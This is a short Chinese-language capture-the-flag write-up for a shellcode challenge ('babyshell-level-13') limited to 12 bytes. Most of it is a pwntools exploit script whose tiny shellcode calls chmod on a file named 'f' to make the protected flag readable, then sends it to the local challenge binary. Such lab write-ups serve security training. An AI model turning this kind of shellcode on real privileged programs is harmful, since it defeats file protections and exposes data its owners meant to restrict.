# 挑战简介
编写并执行shellcode来读取标志，但这次你只得到12个字节！

# 思路
模板可以改进一下，ret可以不要了，毕竟这些题的环境比较简单，不太需要ret操作，所以恰好凑够了12个字节

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-13')

p.recvuntil('Reading 0xc bytes from stdin.\n')

shellcode = asm('''
    push 0x66
    mov rdi, rsp
    mov sil, 4
    mov al, 90
    syscall
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
